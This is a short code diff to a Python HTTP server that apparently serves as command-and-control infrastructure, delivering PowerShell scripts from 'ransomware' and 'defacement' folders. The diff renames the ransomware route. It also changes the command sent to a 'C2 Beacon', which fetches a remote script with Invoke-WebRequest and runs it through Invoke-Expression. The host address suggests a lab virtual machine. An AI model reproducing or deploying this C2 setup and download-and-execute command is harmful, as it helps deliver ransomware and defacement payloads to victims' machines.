@@ -17,7 +17,7 @@ class CustomHandler(SimpleHTTPRequestHandler):
         if self.path == '/shrek_wallpaper':
             self.serve_file('../defacement/shrek_wallpaper.ps1')
             return
-        if self.path == '/awesome':
+        if self.path == '/awesomeware':
             self.serve_file('../ransomware/ransom.ps1')
             return
 
@@ -35,7 +35,7 @@ class CustomHandler(SimpleHTTPRequestHandler):
         self.end_headers()
 
         # Single command sent to C2 Beacon
-        response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/awesome" | Invoke-Expression'''
+        response_content = r'''Invoke-WebRequest -Uri "http://10.0.2.2:8080/awesomeware" | Invoke-Expression'''
         ###########################
 
         self.wfile.write(response_content.encode('utf-8'))
